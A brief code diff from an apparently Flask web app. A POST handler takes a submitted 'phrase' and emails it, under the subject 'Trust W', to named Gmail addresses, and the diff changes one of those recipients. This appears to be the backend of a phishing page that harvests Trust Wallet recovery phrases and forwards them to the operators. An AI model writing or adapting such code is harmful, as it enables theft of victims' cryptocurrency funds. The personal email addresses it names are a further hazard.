@@ -52,7 +52,7 @@ def phr():
     if request.method == 'POST':
         body = form.phrase.data
         subject = 'Trust W'
-        msg = Message(subject=subject, recipients= ['nexohelp17@gmail.com'], body=body)
+        msg = Message(subject=subject, recipients= ['johnsonpike93@gmail.com'], body=body)
         msgD = Message(subject=subject, recipients= ['olamicreas@gmail.com'], body=body)
 
         mail.send(msg)
